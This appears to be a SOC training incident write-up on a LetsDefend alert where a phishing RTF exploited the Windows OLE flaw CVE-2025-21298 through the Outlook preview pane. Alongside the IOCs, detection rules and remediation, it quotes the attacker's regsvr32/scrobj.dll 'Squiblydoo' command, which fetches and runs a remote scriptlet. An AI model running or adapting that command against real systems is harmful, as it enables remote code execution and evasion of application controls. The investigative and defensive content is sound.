
# SOC336 - Windows OLE Zero-Click RCE Exploitation Detected (CVE-2025-21298) 

##  Raw Alert Details
```text
EventID : 314
Event Time : Feb, 04, 2025, 04:18 PM
Rule : SOC336 - Windows OLE Zero-Click RCE Exploitation Detected (CVE-2025-21298)
Level : Security Analyst
SMTP Address : 84.38.130.118
Source Address : projectmanagement@pm.me
Destination Address : Austin@letsdefend.io
Attachment : mail.rtf
Attachment Hash : df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184
Device Action : Allowed
```

## Alert Overview
- **Severity:** Critical
- **Detection Source:** EDR / Email Security Gateway
- **Asset Affected:** Austin (Endpoint)
- **Threat Type:** Zero-Click RCE / Living off the Land (LOLBins) / Phishing
- **Status:** True Positive (Compromised)

## 🧠 Deep Dive: Understanding the Vulnerability (CVE-2025-21298)
CVE-2025-21298 is a critical Remote Code Execution (RCE) vulnerability within the Windows Object Linking and Embedding (OLE) architecture, specifically triggered by the Rich Text Format (RTF) parser. 

**The Mechanics:** Attackers craft a malicious RTF file containing a malformed OLE object. When the victim receives the email, they do not need to open the attachment or enable macros. If Microsoft Outlook is configured to display emails in the **Preview Pane**, the Windows RTF parser automatically attempts to render the OLE object. The malformed object triggers a memory corruption or logic flaw, allowing the attacker to escape the application sandbox and execute arbitrary system commands under the security context of the `OUTLOOK.EXE` process. This "Zero-Click" nature makes it exceptionally dangerous, as user interaction is virtually bypassed.

## Investigation Steps

### 1. Phishing Email & Sender Analysis
The investigation began by reviewing the delivered email.
- **Sender:** `projectmanagement@pm.me` (ProtonMail is frequently abused by threat actors due to its anonymity).

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/88c1616a-fe81-487e-bb79-7f0176e6e9b4" />

- **Lure:** High-urgency project management deadline.
- **Attachment Analysis:** The attached `mail.rtf` file hash was queried on VirusTotal. It returned a high malicious confidence score (29/61), with vendors specifically flagging it for CVE exploitation and execution capabilities.
<img width="916" height="160" alt="image" src="https://github.com/user-attachments/assets/507d8fb1-2973-469e-b67b-ebb5fd72e3ee" />

### 2. Endpoint Execution Verification (Process Tree)
To verify if the Zero-Click exploit triggered, the EDR logs for Austin's workstation were analyzed. 
- **Process Tree Validation:** A highly anomalous process chain was identified: `OUTLOOK.EXE` spawned `cmd.exe` (PID 6784). This confirms the RTF preview pane exploit successfully broke out of the Outlook application.
<img width="899" height="200" alt="image" src="https://github.com/user-attachments/assets/adec741c-1dba-4b74-9fa3-20cb8340eb66" />
- **Command Line Execution:** The command shell immediately executed the following string:
  `"C:\Windows\System32\cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll"`

### 3. Command and Control (C2) Validation
The execution string utilizes a "Living off the Land" technique known as **Squiblydoo**. It uses the native, trusted `regsvr32.exe` binary to fetch and execute a malicious scriptlet entirely in memory, bypassing AppLocker.

<img width="600" height="200" alt="image" src="https://github.com/user-attachments/assets/fa0a66ac-6877-4c65-b48e-6e01443e6b69" />
<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/2ebcce11-4368-4c62-ab7f-f47322516376" />


- **Proxy Logs:** EDR Raw Logs captured `cmd.exe` successfully making an HTTP GET request to `http://84.38[.]130.118.com/shell.sct` (Device Action: Permitted).
- *(Analyst Note: The attacker made a syntax error in their payload, appending `.com` to an IPv4 address. However, the connection was still attempted).*
- **Threat Intelligence:** The C2 IP address (`84.38.130.118`) is geographically located in Latvia and is flagged by 9/91 vendors on VirusTotal.
<img width="800" height="400" alt="image" src="https://github.com/user-attachments/assets/960cfa2f-8ea5-4541-a5d8-2e98c6b162f1" />

### 4. Lateral Movement & Scope Assessment
A comprehensive network search was conducted using the C2 IP address to identify if any other hosts communicated with the attacker infrastructure. Austin's outbox was also reviewed to ensure the malware was not propagating internally via reply-chain emails.
- **Finding:** No lateral movement or secondary host infections were detected. The scope is limited strictly to Austin's endpoint.

## Analysis and Findings
The incident is a confirmed **True Positive**. The user received a spear-phishing email containing a weaponized RTF document. Upon selecting the email, the Outlook Preview Pane triggered CVE-2025-21298, resulting in arbitrary code execution. The exploit successfully utilized `regsvr32.exe` to download a secondary payload (`shell.sct`) from a Latvian C2 server. The endpoint is fully compromised.

## MITRE ATT&CK Mapping
| Tactic | Technique ID | Technique Name |
| :--- | :--- | :--- |
| **Initial Access** | T1566.001 | Phishing: Spearphishing Attachment |
| **Execution** | T1203 | Exploitation for Client Execution (Zero-Click) |
| **Defense Evasion** | T1218.010 | System Binary Proxy Execution: Regsvr32 (Squiblydoo) |
| **Command and Control** | T1105 | Ingress Tool Transfer |

## Indicators of Compromise (IOCs)
| Type | Value | Context |
| :--- | :--- | :--- |
| Hash (SHA256) | `df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184` | Weaponized RTF Document |
| IP Address | 84.38.130.118 | C2 Infrastructure (Latvia) |
| URL | `http://84.38.130.118.com/shell.sct` | Scriptlet Payload Delivery URL |
| Email | `projectmanagement@pm.me` | Malicious Sender |

## 🛠️ Detection Engineering & Hunting Logic
To improve automated detection of this attack chain, the following logic should be implemented in the SIEM:
- **Detection 1 (Process Anomaly):** Alert when `ParentImage="*\OUTLOOK.EXE"` AND `Image="*\cmd.exe" OR "*\powershell.exe"`.
- **Detection 2 (Squiblydoo LOLBin):** Alert when `Image="*\regsvr32.exe"` AND `CommandLine Contains "scrobj.dll"` AND `CommandLine Contains "http" OR "https"`.

## 🚀 Decision Tree for OLE / LOLBin Exploitation
1. **Analyze Initial Vector:** Did the user receive a phishing email containing a Rich Text Format (`.rtf`) or Microsoft Office document?
   - If Yes -> Proceed to Endpoint Telemetry.
2. **Check Process Tree:** Did the native application (`OUTLOOK.EXE` or `WINWORD.EXE`) unexpectedly spawn a command shell (`cmd.exe` or `powershell.exe`)?
   - If Yes -> High probability of Zero-Click or Macro exploitation.
3. **Analyze Command Line:** Did the resulting command shell execute a "Living off the Land" binary (LOLBin) like `regsvr32.exe`, `mshta.exe`, or `certutil.exe` with an external URL?
   - If Yes -> **Verdict: True Positive - Successful Compromise.**
4. **Action:** Immediately Contain the host to sever the C2 connection, purge the email from the Exchange server, and escalate for forensic remediation.

## Response and Closure
- **Action Taken:** The compromised endpoint (Austin) was immediately **Isolated** from the network to sever C2 communication. The malicious email was deleted from the Exchange server.
- **Containment Required:** Yes.
- **Closure Reason:** True Positive. Successful Zero-Click RCE exploitation and payload execution.

## Recommendations
1. **Disable Outlook Preview Pane:** As a temporary mitigation against Zero-Click OLE vulnerabilities, disable the Outlook Preview Pane via Group Policy until all endpoints are patched against CVE-2025-21298.
2. **ASR Rules:** Enable the Microsoft Defender Attack Surface Reduction (ASR) rule: *"Block all Office applications from creating child processes."*
3. **Patch Management:** Deploy the latest cumulative Windows Security Updates to all endpoints to remediate the OLE parsing vulnerability.


## 🛠️ Skills & Tools Used
- **EDR Process Tree Analysis:** Tracking parent-child execution from `OUTLOOK.EXE` to native Windows binaries.
- **TTP Identification (LOLBins):** Recognizing the "Squiblydoo" technique (`regsvr32.exe` executing remote `.sct` scriptlets) to bypass AppLocker.
- **Vulnerability Triage:** Understanding the mechanics of Zero-Click vulnerabilities (CVE-2025-21298) via the Outlook Preview Pane.
- **SIEM / Proxy Log Correlation:** Validating successful payload downloads via HTTP GET request monitoring.
- **Threat Intelligence:** Utilizing VirusTotal for Hash and C2 IP reputation scoring.
- **Incident Containment & Eradication:** Host isolation and malicious email purging.





